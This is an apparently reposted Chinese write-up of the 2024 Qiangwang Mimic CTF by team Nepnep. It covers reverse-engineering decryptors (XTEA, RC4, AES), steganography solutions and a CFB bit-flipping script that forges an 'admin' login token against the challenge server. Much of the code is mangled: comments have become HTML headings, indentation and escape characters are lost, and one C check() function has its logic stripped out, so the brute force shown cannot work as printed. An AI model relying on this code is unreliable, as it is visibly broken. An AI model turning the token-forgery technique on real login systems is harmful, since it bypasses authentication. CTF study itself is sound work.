+<p>0x80, 0x7C, 0xD4, 0xE5, 0x93, 0xD5, 0x1C, 0x8B, 0xF8, 0xDF,</p>
+<p>0xDA, 0xA1, 0x11, 0xF8, 0xA1, 0x93, 0x93, 0xC2, 0x7C, 0x8B,</p>
+<p>0x1C, 0x66, 0x01, 0x3D, 0xA3, 0x67 };</p>
+<p>&#x2F;&#x2F;bArr[i3] &#x3D; (byte)(((str.charAt(i3 % str.length()) – ‘w’) ^ 23) &amp; 255);</p>
+<p>char key_arry[64] &#x3D; {0};</p>
+<p>char key[] &#x3D; “1liIl11lIllIIl11llII”;</p>
+<p>for (int i &#x3D; 0; i &lt; 64; i++) {</p>
+<p>key_arry[i] &#x3D; ((key[i % 20] – ‘w’) ^ 23) % 256;</p>
+<p>}</p>
+<p>int num &#x3D; 11;</p>
+<p>char flag[36] &#x3D; {0};</p>
+<p>for (int i &#x3D; 0; i &lt; 36; i++) {</p>
+<p>for (int j &#x3D; 0; j &lt; ‘}’; j++) {</p>
+<p>if ((char)(num * (j ^ key_arry[i])) &#x3D;&#x3D; enc[i]) {</p>
+<p>flag[i] &#x3D; j;</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>printf(“%s”, flag);</p>
+<p>}</p>
+<p>easyre</p>
+<p>Tracecode，比较长度0x38</p>
+<p>两处数据获取</p>
+<p>输入测试数据 ‘A’ * 0x38 密文如下</p>
+<p>8字节相同，说明加密时8字节一组</p>
+<p>先猜一个TEA算法，trace里搜 9E3779B9</p>
+<p>执行次数 714 次，714 &#x2F; 7 &#x3D; 102，每组执行了102轮</p>
+<p>搜到指令 shr r8d,B ，对应XTEA算法中的 (sum&gt;&gt;11)，找到KEY读取的代码</p>
+<p>0xEF6FD9DB, 0xD2C273D3, 0x6F97E412, 0x72BFD624</p>
+<p>测试发现输入前对密文 xor 0xBF</p>
+<p>JSON</p>
+<p>#include</p>
+<p>#include</p>
+<p>&#x2F;* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] – key[3] *&#x2F;</p>
+<p>void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {</p>
+<p>unsigned int i;</p>
+<p>uint32_t v0&#x3D;v[0], v1&#x3D;v[1], sum&#x3D;0, delta&#x3D;0x9E3779B9;</p>
+<p>for (i&#x3D;0; i &lt; num_rounds; i++) {</p>
+<p>v0 +&#x3D; (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);</p>
+<p>sum +&#x3D; delta;</p>
+<p>v1 +&#x3D; (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);</p>
+<p>}</p>
+<p>v[0]&#x3D;v0; v[1]&#x3D;v1;</p>
+<p>}</p>
+<p>void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {</p>
+<p>unsigned int i;</p>
+<p>uint32_t v0&#x3D;v[0], v1&#x3D;v[1], delta&#x3D;0x9E3779B9, sum&#x3D;delta*num_rounds;</p>
+<p>for (i&#x3D;0; i &lt; num_rounds; i++) {</p>
+<p>v1 -&#x3D; (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);</p>
+<p>sum -&#x3D; delta;</p>
+<p>v0 -&#x3D; (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);</p>
+<p>}</p>
+<p>v[0]&#x3D;v0; v[1]&#x3D;v1;</p>
+<p>}</p>
+<p>int main()</p>
+<p>{</p>
+<p>uint32_t v[]&#x3D;{0x9851E3A1, 0x49765686, 0x812B6B6F, 0x9612CECF, 0x3C3570A2, 0xF15C6231, 0xAA6B77FA, 0xBE056D9E,</p>
+<p>0xF8A424E8, 0x0B3A23DB, 0x03CC2016, 0xA92BB5AD, 0x1D789F34, 0x9EF9B92E,0};</p>
+<p>uint32_t const k[4]&#x3D;{0xEF6FD9DB, 0xD2C273D3, 0x6F97E412, 0x72BFD624};</p>
+<p>unsigned int r&#x3D;102;&#x2F;&#x2F;num_rounds建议取值为32</p>
+<p>&#x2F;&#x2F; v为要加密的数据是两个32位无符号整数</p>
+<p>&#x2F;&#x2F; k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</p>
+<p>for(int i &#x3D; 0; i&lt; 7;i++){</p>
+<p>decipher(r, (v + i * 2), k);</p>
+<p>}</p>
+<p>for(int i &#x3D; 0;i&lt;14;i++){</p>
+<p>v[i] ^&#x3D; 0xbfbfbfbf;</p>
+<p>}</p>
+<p>for(int i &#x3D; 0;i&lt; 0x38 ;i++){</p>
+<p>printf(“%.2x “, <em>((char</em> )(v)+i) &amp; 0xff);</p>
+<p>}</p>
+<p>printf(“n”);</p>
+<p>printf(“%sn”,v);</p>
+<p>return 0;</p>
+<p>}</p>
+<p>66 6c 61 67 7b 75 5f 61 72 b3 5f 72 65 40 b1 b1 79 5f 67 b0 b0 64 5f 40 74 5f b0 b1 b1 76 6d 5f 64 65 b0 62 66 5f 61 6e 64 5f 61 6e 74 69 5f 64 65 62 75 67 67 65 72 7d</p>
+<p>发现仍有乱码，bx，这些转成数字 3x</p>
+<p>A_game</p>
+<p>有个调试器检测，判断其不是被powershell或者正常打开的就会退出，这里patch了</p>
+<p>首先通过读写文件的api定位到关键函数，其中该函数会在退出游戏时调用。</p>
+<p>把game.tmp解密产生了game.ps1</p>
+<p>ps1是个混淆的powershell脚本，每段脚本最前面是个iex 执行，去掉后运行一下，可直接解密出下一段脚本，</p>
+<p>继续运行，得到真正的加密脚本。</p>
+<p>对照其加密逻辑解密即可</p>
+<p>JSON</p>
+<p>enc &#x3D; [38304, 8928, 43673, 25957, 67260, 47152, 16656, 62832,</p>
+<p>19480, 66690, 40432, 15072, 63427, 28558, 54606,</p>
+<p>47712, 18240, 68187, 18256, 63954, 48384, 14784,</p>
+<p>60690, 21724, 53238, 64176, 9888, 54859, 23050,</p>
+<p>58368, 46032, 15648, 64260, 17899, 52782, 51968,</p>
+<p>12336, 69377, 27844, 43206, 63616]</p>
+<p>key2 &#x3D; [0x70, 0x30, 0x77, 0x65, 0x72]</p>
+<p>for i in range(len(enc)):</p>
+<p>enc[i] -&#x3D; key2[i % len(key2)]</p>
+<p>for i in range(len(enc)):</p>
+<p>enc[i] -&#x3D; key2[i % len(key2)]</p>
+<p>key3 &#x3D; [0x70, 0x30, 0x77, 0x33, 0x72]</p>
+<p>for i in range(len(enc)):</p>
+<p>enc[i] &#x3D; int(enc[i] &#x2F; key3[i % len(key3)])</p>
+<p>for i in range(len(enc)):</p>
+<p>enc[i] -&#x3D; key2[i % len(key2)]</p>
+<p>for i in range(len(enc)):</p>
+<p>enc[i] -&#x3D; key2[i % len(key2)]</p>
+<p>for i in range(len(enc)):</p>
+<p>enc[i] -&#x3D; key2[i % len(key2)]</p>
+<p>def rc4(key, plaintext):</p>
+<p>S &#x3D; list(range(256))</p>
+<p>j &#x3D; 0</p>
+<p>for i in range(256):</p>
+<p>j &#x3D; (j + S[i] + key[i % len(key)]) % 256</p>
+<p>S[i], S[j] &#x3D; S[j], S[i]</p>
+<p>i &#x3D; 0</p>
+<p>j &#x3D; 0</p>
+<p>ciphertext &#x3D; []</p>
+<p>for k in range(len(plaintext)):</p>
+<p>i &#x3D; (i + 1) % 256</p>
+<p>j &#x3D; (j + S[i]) % 256</p>
+<p>S[i], S[j] &#x3D; S[j], S[i]</p>
+<p>t &#x3D; (S[i] + S[j]) % 256</p>
+<p>ciphertext.append(plaintext[k] ^ S[t])</p>
+<p>return ciphertext</p>
+<p>def enenenenene1_decrypt(encrypted_data):</p>
+<p>key &#x3D; [0x70, 0x6f, 0x77, 0x65, 0x72]</p>
+<p>plaintext &#x3D; “”</p>
+<p>for _ in range(36):</p>
+<p>current_encrypted_text &#x3D; encrypted_data[:-len(key)]</p>
+<p>current_key &#x3D; rc4(current_encrypted_text,encrypted_data[-len(key):])</p>
+<p>current_encrypted_text &#x3D; rc4(current_key, current_encrypted_text)</p>
+<p>plaintext &#x3D; current_encrypted_text</p>
+<p>return plaintext</p>
+<p>decrypted_plaintext &#x3D; enenenenene1_decrypt(enc)</p>
+<p>for c in decrypted_plaintext:</p>
+<p>print(chr(c),end&#x3D;””)</p>
+<p>babyre</p>
+<p>标准AES,KEY 35 77 40 2E CC A4 4A 3F  9A B7 21 82 F9 B0 1F 35</p>
+<p>不过这里是无填充的</p>
+<p>后面是转成二进制然后求z3</p>
+<p>z3转太麻烦了，不如直接爆破</p>
+<p>JSON</p>
+<p>#include</p>
+<p>int check(int a1[])</p>
+<p>{</p>
+<p>int v1;          &#x2F;&#x2F; r8d</p>
+<p>int v2;          &#x2F;&#x2F; ecx</p>
+<p>int v3;          &#x2F;&#x2F; ecx</p>
+<p>int ANS[12];     &#x2F;&#x2F; [rsp+8h] [rbp-38h]</p>
+<p>int i;           &#x2F;&#x2F; [rsp+38h] [rbp-8h]</p>
+<p>unsigned int v7; &#x2F;&#x2F; [rsp+3Ch] [rbp-4h]</p>
+<p>v7 &#x3D; 1;</p>
+<p>for (int i &#x3D; 0; i &lt; 12; i++)</p>
+<p>{</p>
+<p>ANS[i] &#x3D; a1[11 – i];</p>
+<p>}</p>
+<p>v7 &#x3D; 0;</p>
+<p>return v7;</p>
+<p>}</p>
+<p>int main()</p>
+<p>{</p>
+<p>int ANS[12];</p>
+<p>for (int i &#x3D; 0; i &lt; 16; i++)</p>
+<p>{</p>
+<p>ANS[8] &#x3D; i &amp; 0x8 ? 1 : 0;</p>
+<p>ANS[9] &#x3D; i &amp; 0x4 ? 1 : 0;</p>
+<p>ANS[10] &#x3D; i &amp; 0x2 ? 1 : 0;</p>
+<p>ANS[11] &#x3D; i &amp; 0x1 ? 1 : 0;</p>
+<p>for (int x &#x3D; 0; x &lt; 256; x++)</p>
+<p>{</p>
+<p>for (int j &#x3D; 0; j &lt; 8; j++)</p>
+<p>{</p>
+<p>ANS[j] &#x3D; (x &gt;&gt; (7 – j) &amp; 1) ? 1 : 0;</p>
+<p>}</p>
+<p>&#x2F;&#x2F; Check</p>
+<p>&#x2F;&#x2F; for (int q &#x3D; 0; q &lt; 12; q++)</p>
+<p>&#x2F;&#x2F; {</p>
+<p>&#x2F;&#x2F;     printf(“%d”, ANS[q]);</p>
+<p>&#x2F;&#x2F; }</p>
+<p>&#x2F;&#x2F; printf(“n”);</p>
+<p>if (check(ANS))</p>
+<p>{</p>
+<p>printf(“%.2xn”, x);</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>return 0;</p>
+<p>}</p>
+<p>得到AES后的密文 128fecc28504b24c5bba4acf11360a48</p>
+<p>应输入 4d87ef03-77bb-491a-80f5-4620245807c4</p>
+<p>Misc:</p>
+<p>ezflag</p>
+<p>两个tcp流里的data提出来放一起，是个压缩包，解压</p>
+<p>flag.zip是png,改后缀打开就行了</p>
+<p>PVZ</p>
+<p>根据提示，估算花了500-2000阳光</p>
+<p>写脚本生成字典</p>
+<p>JSON</p>
+<p>import hashlib</p>
+<h1 id="创建一个新的TXT文件"><a href="#创建一个新的TXT文件" class="headerlink" title="创建一个新的TXT文件"></a>创建一个新的TXT文件</h1><p>with open(‘md5_hashes.txt’, ‘w’) as file:</p>
+<h1 id="遍历从500到2000的每个数字"><a href="#遍历从500到2000的每个数字" class="headerlink" title="遍历从500到2000的每个数字"></a>遍历从500到2000的每个数字</h1><p>for number in range(500, 2001):</p>
+<h1 id="将数字转换为字符串并计算MD5哈希值"><a href="#将数字转换为字符串并计算MD5哈希值" class="headerlink" title="将数字转换为字符串并计算MD5哈希值"></a>将数字转换为字符串并计算MD5哈希值</h1><p>md5_hash &#x3D; hashlib.md5(str(number).encode()).hexdigest()</p>
+<h1 id="将哈希值写入文件，每个哈希值占一行"><a href="#将哈希值写入文件，每个哈希值占一行" class="headerlink" title="将哈希值写入文件，每个哈希值占一行"></a>将哈希值写入文件，每个哈希值占一行</h1><p>file.write(md5_hash + ‘n’)</p>
+<p>print(“MD5哈希值已生成并写入 md5_hashes.txt 文件。”)</p>
+<p>爆破密码</p>
+<p>解压以后看到一个二维码，用扫描全能王拉伸，补齐三个角，微信可以识别了</p>
+<p>看文件名搜到Malbolge</p>
+<p>在线网站解密就行了</p>
+<p>Streaming</p>
+<p>h264流</p>
+<p>解码一下</p>
+<p>插件提取</p>
+<p>打开视频看</p>
+<p>flag1</p>
+<p>看到一大串ff,先亦或ff</p>
+<p>‘flag{3b3a9c08-‘</p>
+<p>拿这个做密钥aes解密，可以的到一个压缩包</p>
+<p>压缩包里有两个文件</p>
+<p>flag2</p>
+<p>看badapple</p>
+<p>FotoForensics – Analysis</p>
+<p>在线工具梭，苹果图片解析差异</p>
+<p>flag3</p>
+<p>补全文件头打开，看到一个只有黑白帧的视频，写脚本提取</p>
+<p>JSON</p>
+<p>from moviepy.editor import VideoFileClip</p>
+<p>import numpy as np</p>
+<p>def is_black_frame(frame, threshold&#x3D;0):</p>
+<p>“””</p>
+<p>判断一个帧是否为黑色帧。</p>
+<p>如果帧的所有像素值都小于等于阈值，则认为该帧为黑色帧。</p>
+<p>“””</p>
+<p>return np.all(frame[:, :, :3] &lt;&#x3D; threshold)</p>
+<p>def process_video(video_path):</p>
+<p>video &#x3D; VideoFileClip(video_path)</p>
+<p>frames &#x3D; video.iter_frames()</p>
+<p>binary_string &#x3D; ”</p>
+<p>for frame in frames:</p>
+<p>if is_black_frame(frame):</p>
+<p>binary_string +&#x3D; ‘1’</p>
+<p>else:</p>
+<p>binary_string +&#x3D; ‘0’</p>
+<h1 id="转换为ASCII字符"><a href="#转换为ASCII字符" class="headerlink" title="转换为ASCII字符"></a>转换为ASCII字符</h1><p>ascii_string &#x3D; ”.join(chr(int(binary_string[i:i + 8], 2)) for i in range(0, len(binary_string), 8))</p>
+<p>return ascii_string</p>
+<h1 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h1><p>video_path &#x3D; ‘2.mov’  # 替换为你的MOV视频文件路径</p>
+<p>ascii_result &#x3D; process_video(video_path)</p>
+<p>print(ascii_result)</p>
+<p>FIND WAY to read video</p>
+<p>社工 找到gitcode  垃圾邮件加密，</p>
+<p>复制时要把md文件clone下来再复制，否则直接以md复制会有格式错误，在解码时会出现乱码</p>
+<p>解码之后</p>
+<p>一段BV1wm2EY2Egx</p>
+<p>一段base</p>
+<p>JSON</p>
+<p>eyJ2IjozLCJuIjoiZjE0ZyIsInMiOiIiLCJoIjoiZjczZDEyZCIsIm0iOjkwLCJrIjo4MSwibWci<br>OjIwMCwia2ciOjEzMCwibCI6NDMsInNsIjoxLCJmaGwiOlsiMjUyZjEwYyIsImFjYWM4NmMiLCJj<br>YTk3ODExIiwiY2QwYWE5OCIsIjAyMWZiNTkiLCIyYzYyNDIzIiwiNGUwNzQwOCIsIjRlMDc0MDgi<br>LCJjYTk3ODExIiwiMmU3ZDJjMCIsIjZiODZiMjciLCIzZjc5YmI3IiwiNGUwNzQwOCIsIjM5NzNl<br>MDIiLCJkNDczNWUzIiwiNGIyMjc3NyIsIjc5MDI2OTkiLCJlN2Y2YzAxIiwiMzk3M2UwMiIsIjRi<br>MjI3NzciLCI0YjIyNzc3IiwiNmI4NmIyNyIsIjJlN2QyYzAiLCIzOTczZTAyIiwiY2E5NzgxMSIs<br>IjNmNzliYjciLCI0ZTA3NDA4IiwiZDQ3MzVlMyIsIjM5NzNlMDIiLCIzZjc5YmI3IiwiM2Y3OWJi<br>NyIsIjI1MmYxMGMiLCIzZjc5YmI3IiwiNmI4NmIyNyIsIjE4YWMzZTciLCI1ZmVjZWI2IiwiNGUw<br>NzQwOCIsIjE4YWMzZTciLCIxOGFjM2U3IiwiMTk1ODFlMiIsIjNmNzliYjciLCJkMTBiMzZhIiwi<br>MDFiYTQ3MSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5<br>IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0<br>MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2<br>ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjki<br>LCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQw<br>YjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZl<br>MzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNzdhZGZjOSIs<br>ImRlN2QxYjciLCI0NGJkN2FlIiwiYmI3MjA4YiIsIjgzODkxZDciLCIyYTBhYjczIiwiZmUxZGNk<br>MyIsIjU1OWFlYWQiLCJmMDMxZWZhIl19</p>
+<p>猜测base这段是视频的某种源，没想到有啥用</p>
+<p>然后一个分p90段的视频</p>
+<p>[clip.zip]</p>
+<p>切片完之后的</p>
+<p>从0005到0132好像是在递增，描述128位，然后从133开始到后面</p>
+<p>头4张图片跟尾4张图片没看出来有啥用</p>
+<p>然后就是看像素点，像素点是从24位到40位都出现过白点，也就是都是1，但是第24位好像一直都是1，也就没管，就是从25位到40位，正好16位</p>
+<p>不过咋都分析不出来，回头想到唯独漏掉了第五张图片0004，细细看了一眼每个视频这一帧都不一样，提取其像素，转为01字符串，转ASCII得到flag.</p>
+<p>想来是只看到了第一个视频的这张图，想当然以为这是从0开始，而把它忽略了。</p>
+<p>JSON</p>
+<p>分析像素点的代码，将就着看</p>
+<p>import time</p>
+<p>for k in range(90):</p>
+<p>m&#x3D;1</p>
+<p>for i in range(4,5):</p>
+<p>directory &#x3D; f’D:\qqfile\cli\frames_output{k}\frame_{i:<br>04d}.png’  # 替换为你的目录路径</p>
+<p>from PIL import Image</p>
+<p>sum_x&#x3D;[]</p>
+<h1 id="打开图像"><a href="#打开图像" class="headerlink" title="打开图像"></a>打开图像</h1><p>image_path &#x3D; ‘path_to_your_image.jpg’  # 替换为你的图像路径</p>
+<p>image &#x3D; Image.open(directory)</p>
+<p>width, height &#x3D; image.size</p>
+<h1 id="print-f”Image-dimensions-width-x-height-”"><a href="#print-f”Image-dimensions-width-x-height-”" class="headerlink" title="print(f”Image dimensions: {width}x{height}”)"></a>print(f”Image dimensions: {width}x{height}”)</h1><p>flag&#x3D;[‘0’]*8</p>
+<h1 id="提取特定像素点的颜色值"><a href="#提取特定像素点的颜色值" class="headerlink" title="提取特定像素点的颜色值"></a>提取特定像素点的颜色值</h1><h1 id="x-y-5-0-替换为你感兴趣的像素位置"><a href="#x-y-5-0-替换为你感兴趣的像素位置" class="headerlink" title="x, y &#x3D; 5, 0  # 替换为你感兴趣的像素位置"></a>x, y &#x3D; 5, 0  # 替换为你感兴趣的像素位置</h1><h1 id="pixel-value-image-getpixel-x-y"><a href="#pixel-value-image-getpixel-x-y" class="headerlink" title="pixel_value &#x3D; image.getpixel((x, y))"></a>pixel_value &#x3D; image.getpixel((x, y))</h1><h1 id="print-image-getpixel-33-2"><a href="#print-image-getpixel-33-2" class="headerlink" title="print(image.getpixel((33, 2)))"></a>print(image.getpixel((33, 2)))</h1><p>for x in range(32,32+8):</p>
+<h1 id="for-y-in-range-224"><a href="#for-y-in-range-224" class="headerlink" title="for y in range(224):"></a>for y in range(224):</h1><p>pixel_value &#x3D; image.getpixel((x, 0))</p>
+<h1 id="pixel-value2-image2-getpixel-x-0"><a href="#pixel-value2-image2-getpixel-x-0" class="headerlink" title="pixel_value2 &#x3D; image2.getpixel((x, 0))"></a>pixel_value2 &#x3D; image2.getpixel((x, 0))</h1><h1 id="pixel-value2-image3-getpixel-x-0"><a href="#pixel-value2-image3-getpixel-x-0" class="headerlink" title="pixel_value2 &#x3D; image3.getpixel((x, 0))"></a>pixel_value2 &#x3D; image3.getpixel((x, 0))</h1><p>if pixel_value &gt;&#x3D; (10,10,10):</p>
+<h1 id="print-f”Pixel-value-at-x-0-pixel-value-”"><a href="#print-f”Pixel-value-at-x-0-pixel-value-”" class="headerlink" title="print(f”Pixel value at ({x}, {0}): {pixel_value}”)"></a>print(f”Pixel value at ({x}, {0}): {pixel_value}”)</h1><p>flag[(x-25)]&#x3D;’1′</p>
+<h1 id="print-flag"><a href="#print-flag" class="headerlink" title="print(flag)"></a>print(flag)</h1><p>flag&#x3D;”.join(flag)</p>
+<p>print(chr(int(flag, 2)), end&#x3D;”)</p>
+<p>Crypto:</p>
+<p>xor</p>
+<p>mimic is a keyword.</p>
+<p>0b050c0e180e585f5c52555c5544545c0a0f44535f0f5e445658595844050f5d0f0f55590c555e5a0914</p>
+<p>简单异或一下</p>
+<p>CFBchall</p>
+<p>CFB模式在解密时，密文中一位数据的改变仅会影响两个明文块：对应平文块中的一位数据与下一块中全部的数据，而之后的数据将恢复正常。</p>
+<p>在解密时，改变某一个字节数据的一些最低比特时，仍能解密，解密出来的数据与原数据相近（但并不同），可以利用该点来得到我们的username，如当我们注册时username以admim开头，改变加密后最后一个m所对应的数据的比特（如加减1， 2等），有几率得到admin</p>
+<p>因改变了m的加密数据，后16个字节收到影响，我们有x00进行截断分割，可以填充17个字节垃圾数据，爆破这17个字节加密后的第一个字节，使得该字节解密后得到x00，16个字节垃圾数据受到影响，但被爆破得到的x00和原数据自带的x00分割后被丢弃。</p>
+<p>同理，因password有长度限制（不可小于8），admin对应的密码为123456。我们将password设置为17个垃圾数据加123456，改变第一个字节数据，后16个字节受影响，爆破第一个加密后的字节，使得第17个字节为x00将垃圾数据截断。</p>
+<p>题目限制了输入为可见字符，无法直接使用x00截断，而采取一定的爆破；题目给了500次登录尝试，我们分2批分别爆破username和password各256次，运气好点还是绰绰有余的。先爆破username，将密码设置为你的垃圾数据+123456，先确保username&#x3D;admin返回密码错误的msg，在爆破password得到flag</p>
+<p>Python</p>
+<p>import  requests</p>
+<p>url &#x3D; “<a target="_blank" rel="noopener" href="http://web-bd8cccca1c.challenge.xctf.org.cn/%E2%80%9D">http://web-bd8cccca1c.challenge.xctf.org.cn:80/”</a></p>
+<h1 id="url-“http-127-0-0-1"><a href="#url-“http-127-0-0-1" class="headerlink" title="url &#x3D; “http://127.0.0.1:"></a>url &#x3D; “<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a>:</h1><p>5000”</p>
+<p>def reflash():</p>
+<p>requests.post(url, json&#x3D;{“action”: “restart”})</p>
+<p>def encrypy_web():</p>
+<p>data &#x3D; {“action”: “register”, “username”: username, “password”: password}</p>
+<p>token &#x3D; requests.post(url, json&#x3D;data).json()[“message”]</p>
+<p>return token.split(‘: ‘)[1]</p>
+<p>def decrypt_web(token, password):</p>
+<p>data &#x3D; {“action”: “login”, “username”: “admin”, “password”: password, “token”: token}</p>
+<p>return requests.post(url, json&#x3D;data).json()[“message”]</p>
+<h1 id="iv-b”2″-16"><a href="#iv-b”2″-16" class="headerlink" title="iv &#x3D; b”2″*16"></a>iv &#x3D; b”2″*16</h1><h1 id="key-b”1″-16"><a href="#key-b”1″-16" class="headerlink" title="key &#x3D; b”1″*16"></a>key &#x3D; b”1″*16</h1><p>username &#x3D; “admim” + “x09” * 17</p>
+<p>password &#x3D; “x09” * 17 + “123456”</p>
+<p>data &#x3D; f”{username}x00{password}x01x02x03″</p>
+<p>while True:</p>
+<h1 id="initialize-globals"><a href="#initialize-globals" class="headerlink" title="initialize_globals()"></a>initialize_globals()</h1><p>reflash()</p>
+<h1 id="token-encrypt-data-key"><a href="#token-encrypt-data-key" class="headerlink" title="token &#x3D; encrypt(data, key)"></a>token &#x3D; encrypt(data, key)</h1><p>token &#x3D; encrypy_web()</p>
+<p>flag &#x3D; 0</p>
+<p>token0 &#x3D; token[:9] + hex((int(token[9], 16) – 1)%16)[2:].zfill(1)</p>
+<h1 id="if-token0-10-encrypt-“admin”-key-continue"><a href="#if-token0-10-encrypt-“admin”-key-continue" class="headerlink" title="if token0[:10] !&#x3D; encrypt(“admin”, key): continue"></a>if token0[:10] !&#x3D; encrypt(“admin”, key): continue</h1><h1 id="print-encrypt-“adminx00”-key"><a href="#print-encrypt-“adminx00”-key" class="headerlink" title="print(encrypt(“adminx00”, key))"></a>print(encrypt(“adminx00”, key))</h1><h1 id="print-token"><a href="#print-token" class="headerlink" title="print(token)"></a>print(token)</h1><p>for i in range(256):</p>
+<p>ct &#x3D; token0 + hex(i)[2:].zfill(2) + token[12:]</p>
+<h1 id="print-ct"><a href="#print-ct" class="headerlink" title="print(ct)"></a>print(ct)</h1><h1 id="decrypted-decrypt-ct-key"><a href="#decrypted-decrypt-ct-key" class="headerlink" title="decrypted &#x3D; decrypt(ct, key)"></a>decrypted &#x3D; decrypt(ct, key)</h1><p>decrypted &#x3D; decrypt_web(ct, password)</p>
+<h1 id="print-i-decrypted"><a href="#print-i-decrypted" class="headerlink" title="print(i, decrypted)"></a>print(i, decrypted)</h1><h1 id="token-username-token-password-decrypted-split-b’x00′"><a href="#token-username-token-password-decrypted-split-b’x00′" class="headerlink" title="token_username, *_, token_password &#x3D; decrypted.split(b’x00′)"></a>token_username, *_, token_password &#x3D; decrypted.split(b’x00′)</h1><h1 id="token-password-token-password-3"><a href="#token-password-token-password-3" class="headerlink" title="token_password &#x3D; token_password[:-3]"></a>token_password &#x3D; token_password[:-3]</h1><h1 id="print-hex-i-2-zfill-2-token-username-token-password"><a href="#print-hex-i-2-zfill-2-token-username-token-password" class="headerlink" title="print(hex(i)[2:].zfill(2), token_username, _, token_password)"></a>print(hex(i)[2:].zfill(2), token_username, _, token_password)</h1><p>print(decrypted)</p>
+<p>if decrypted &#x3D;&#x3D; ‘Admin login failed, please try again’:</p>
+<h1 id="if-token-username-b”admin”"><a href="#if-token-username-b”admin”" class="headerlink" title="if token_username &#x3D;&#x3D; b”admin”"></a>if token_username &#x3D;&#x3D; b”admin”</h1><p>print(i)</p>
+<p>flag &#x3D; 1</p>
+<h1 id="input"><a href="#input" class="headerlink" title="input()"></a>input()</h1><p>break</p>
+<p>if flag &#x3D;&#x3D; 0: continue</p>
+<p>ct0 &#x3D; token0 + hex(i)[2:].zfill(2)</p>
+<p>for i in range(256):</p>
+<p>ct &#x3D; ct0 + token[12:12 + 44] + hex(i)[2:].zfill(2) + token[-50:]</p>
+<h1 id="decrypted-decrypt-ct-key-1"><a href="#decrypted-decrypt-ct-key-1" class="headerlink" title="decrypted &#x3D; decrypt(ct, key)"></a>decrypted &#x3D; decrypt(ct, key)</h1><p>decrypted &#x3D; decrypt_web(ct, “123456”)</p>
+<h1 id="print-decrypted-split-b’x00′"><a href="#print-decrypted-split-b’x00′" class="headerlink" title="print(decrypted.split(b’x00′))"></a>print(decrypted.split(b’x00′))</h1><h1 id="token-username-token-password-decrypted-split-b’x00′-1"><a href="#token-username-token-password-decrypted-split-b’x00′-1" class="headerlink" title="token_username, *_, token_password &#x3D; decrypted.split(b’x00′)"></a>token_username, *_, token_password &#x3D; decrypted.split(b’x00′)</h1><h1 id="token-password-token-password-3-1"><a href="#token-password-token-password-3-1" class="headerlink" title="token_password &#x3D; token_password[:-3]"></a>token_password &#x3D; token_password[:-3]</h1><h1 id="print-hex-i-2-zfill-2-token-username-token-password-1"><a href="#print-hex-i-2-zfill-2-token-username-token-password-1" class="headerlink" title="print(hex(i)[2:].zfill(2), token_username, _, token_password)"></a>print(hex(i)[2:].zfill(2), token_username, _, token_password)</h1><h1 id="if-username-token-username-and-password-token-password"><a href="#if-username-token-username-and-password-token-password" class="headerlink" title="if username &#x3D;&#x3D; token_username and password &#x3D;&#x3D; token_password:"></a>if username &#x3D;&#x3D; token_username and password &#x3D;&#x3D; token_password:</h1><h1 id="if-token-password-b’123456′"><a href="#if-token-password-b’123456′" class="headerlink" title="if token_password &#x3D;&#x3D; b’123456′:"></a>if token_password &#x3D;&#x3D; b’123456′:</h1><h1 id="print-token-password"><a href="#print-token-password" class="headerlink" title="print(token_password)"></a>print(token_password)</h1><p>if “flag” in decrypted:</p>
+<p>print(decrypted)</p>
+<p>flag &#x3D; 1</p>
+<p>break</p>
+<p>if flag &#x3D;&#x3D; 1:</p>
+<p>break</p>
+<p>原文始发于微信公众号（Nepnep网络安全）：2024 强网拟态 Nepnep WP</p>
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/211007.html">https://www.ctfiot.com/211007.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/2024_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81_Nepnep_WP.full.md">CTF大赛WP集合&#x2F;articles&#x2F;2024_强网拟态_Nepnep_WP.full.md</a></p>
+</blockquote>
